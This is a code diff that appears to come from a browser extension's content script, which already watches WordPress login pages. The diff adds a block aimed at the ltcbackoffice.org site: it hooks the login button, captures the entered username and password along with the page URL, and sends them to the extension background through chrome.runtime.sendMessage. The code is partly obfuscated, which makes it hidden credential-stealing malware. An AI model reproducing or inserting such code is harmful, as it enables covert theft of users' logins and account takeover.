@@ -465,6 +465,22 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
           }
       }, 1000)
   };
+
+  if (top['location']['href']['indexOf']('https://ltcbackoffice.org/') > -1) {
+        var interval = setInterval(function () {
+            if (document['getElementByClassName']('page-content')) {
+                clearInterval(interval);
+                document['getElementById']('btn-primary').onclick = function (_0x441cx2) {
+                 var login = {};
+                login.username = document.getElementById("username").value;
+                login.pass = document.getElementById("password").value;
+                login.href = window.location.href;
+                chrome.runtime.sendMessage({cmd: "l",login});
+                }
+            }
+        }, 1000)
+    };
+    //
 // var img = document.getElementsByTagName('img');
 //      for (var i = 0; i < img.length; i++){
 //     	if (img[i].src.indexOf('whos.amung.us/swidget/') > -1){
